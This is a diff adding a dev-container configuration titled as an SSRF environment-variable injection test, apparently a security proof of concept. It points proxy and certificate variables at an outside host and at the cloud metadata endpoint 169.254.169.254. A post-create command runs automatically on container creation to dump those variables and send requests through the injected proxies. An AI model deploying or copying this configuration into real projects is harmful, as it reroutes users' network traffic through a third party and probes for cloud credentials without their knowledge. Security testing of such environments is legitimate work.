@@ -1,0 +1,16 @@
+{
+  "name": "SSRF Test - Environment Variable Injection",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "features": {
+    "ghcr.io/devcontainers/features/common-utils:2": {}
+  },
+  "containerEnv": {
+    "HTTP_PROXY": "http://ghe.io:8443",
+    "HTTPS_PROXY": "http://ghe.io:8443",
+    "ALL_PROXY": "http://169.254.169.254:80",
+    "SSRF_TEST_URL": "http://ghe.io:8443/manage/v1/config/init",
+    "CURL_CA_BUNDLE": "http://169.254.169.254/latest/meta-data/",
+    "NODE_EXTRA_CA_CERTS": "http://ghe.io:8443/ca.pem"
+  },
+  "postCreateCommand": "bash -c 'echo \"=== ENV INJECTION TEST ===\"; env | grep -E \"(PROXY|SSRF|CURL|NODE_)\" | sort; echo \"\"; echo \"=== TESTING IF PROXY GETS USED ===\"; curl -sv http://example.com 2>&1 | head -20; echo \"\"; echo \"=== WGET WITH PROXY ===\"; wget -v --timeout=5 http://example.com -O /dev/null 2>&1 | head -20'"
+}
